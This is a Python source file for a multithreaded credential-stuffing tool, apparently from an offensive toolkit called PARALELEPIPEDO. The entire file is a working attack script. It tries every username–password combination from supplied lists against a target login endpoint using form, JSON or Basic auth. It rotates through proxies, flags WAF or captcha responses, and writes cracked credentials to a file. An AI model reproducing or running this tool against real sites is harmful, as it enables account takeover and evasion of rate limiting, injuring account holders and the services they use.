#!/usr/bin/env python3
# =============================================================================
# Filename: credential_stuffing.py
# Description: Credential stuffing tool with proxy rotation, rate limiting,
#              WAF/captcha detection, and multiple auth types (form/json/basic).
# Author: PARALELEPIPEDO Toolkit
# =============================================================================

import argparse
import json
import re
import threading
import time
from base64 import b64encode
from itertools import cycle
from queue import Queue

import requests
from colorama import Fore, Style, init

init(autoreset=True)

CAPTCHA_INDICATORS = [
    "captcha", "recaptcha", "cloudflare", "challenge", "bot protection",
    "ddos", "access denied", "ray id", "cf-ray"
]


def load_lines(filepath):
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]


def detect_waf(response):
    code = response.status_code
    if code in (403, 429):
        return True
    body = response.text.lower()
    for indicator in CAPTCHA_INDICATORS:
        if indicator in body:
            return True
    return False


def try_credential(url, username, password, user_field, pass_field,
                   auth_type, success_pattern, proxy, session):
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        if auth_type == "basic":
            token = b64encode(f"{username}:{password}".encode()).decode()
            headers = {"Authorization": f"Basic {token}"}
            resp = session.get(url, headers=headers, proxies=proxies, timeout=10, allow_redirects=True)
        elif auth_type == "json":
            body = {user_field: username, pass_field: password}
            resp = session.post(url, json=body, proxies=proxies, timeout=10, allow_redirects=True)
        else:  # form
            body = {user_field: username, pass_field: password}
            resp = session.post(url, data=body, proxies=proxies, timeout=10, allow_redirects=True)

        if detect_waf(resp):
            return "waf", resp

        if success_pattern:
            if re.search(success_pattern, resp.text, re.IGNORECASE):
                return "success", resp
        else:
            if resp.status_code in (200, 302):
                return "success", resp

        return "fail", resp

    except Exception as e:
        return "error", str(e)


def worker(args, combo_queue, proxy_cycle, semaphore, results, lock):
    session = requests.Session()
    while not combo_queue.empty():
        try:
            username, password = combo_queue.get_nowait()
        except Exception:
            break

        with semaphore:
            proxy = next(proxy_cycle) if proxy_cycle else None
            status, resp = try_credential(
                args.url, username, password,
                args.user_field, args.pass_field,
                args.auth_type, args.success_pattern,
                proxy, session
            )

            if status == "success":
                print(f"{Fore.GREEN}[+] SUCCESS  {username}:{password}{Style.RESET_ALL}")
                with lock:
                    results.append({"username": username, "password": password, "url": args.url})
            elif status == "waf":
                print(f"{Fore.YELLOW}[!] WAF/CAPTCHA  {username}:{password} (proxy={proxy}){Style.RESET_ALL}")
            elif status == "error":
                print(f"{Fore.RED}[E] ERROR    {username}:{password} => {resp}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] FAIL     {username}:{password}{Style.RESET_ALL}")

            if args.delay > 0:
                time.sleep(args.delay)

        combo_queue.task_done()


def main():
    parser = argparse.ArgumentParser(
        description="PARALELEPIPEDO - Credential Stuffing Tool",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument("--url", required=True, help="Target login URL")
    parser.add_argument("--userlist", required=True, help="File with usernames")
    parser.add_argument("--passlist", required=True, help="File with passwords")
    parser.add_argument("--user-field", default="username", help="Form username field name")
    parser.add_argument("--pass-field", default="password", help="Form password field name")
    parser.add_argument("--auth-type", choices=["form", "json", "basic"], default="form",
                        help="Authentication type")
    parser.add_argument("--threads", type=int, default=5, help="Number of threads")
    parser.add_argument("--delay", type=float, default=0.5,
                        help="Seconds delay between requests per thread")
    parser.add_argument("--proxy-list", help="File with proxies (one per line)")
    parser.add_argument("--output-file", help="JSON output file for successful credentials")
    parser.add_argument("--success-pattern", help="Regex pattern indicating login success")
    args = parser.parse_args()

    print(f"{Fore.CYAN}[*] PARALELEPIPEDO Credential Stuffing{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Target : {args.url}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Auth   : {args.auth_type}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Threads: {args.threads}{Style.RESET_ALL}")

    users = load_lines(args.userlist)
    passwords = load_lines(args.passlist)

    proxies = []
    if args.proxy_list:
        proxies = load_lines(args.proxy_list)
        print(f"{Fore.CYAN}[*] Proxies: {len(proxies)} loaded{Style.RESET_ALL}")

    proxy_cycle = cycle(proxies) if proxies else None
    combo_queue = Queue()
    for u in users:
        for p in passwords:
            combo_queue.put((u, p))

    total = combo_queue.qsize()
    print(f"{Fore.CYAN}[*] Combos : {total}{Style.RESET_ALL}\n")

    results = []
    lock = threading.Lock()
    semaphore = threading.Semaphore(args.threads)
    threads = []

    for _ in range(args.threads):
        t = threading.Thread(
            target=worker,
            args=(args, combo_queue, proxy_cycle, semaphore, results, lock),
            daemon=True
        )
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print(f"\n{Fore.CYAN}[*] Done. {len(results)} credential(s) found.{Style.RESET_ALL}")

    if args.output_file and results:
        with open(args.output_file, "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2)
        print(f"{Fore.GREEN}[+] Results saved to {args.output_file}{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
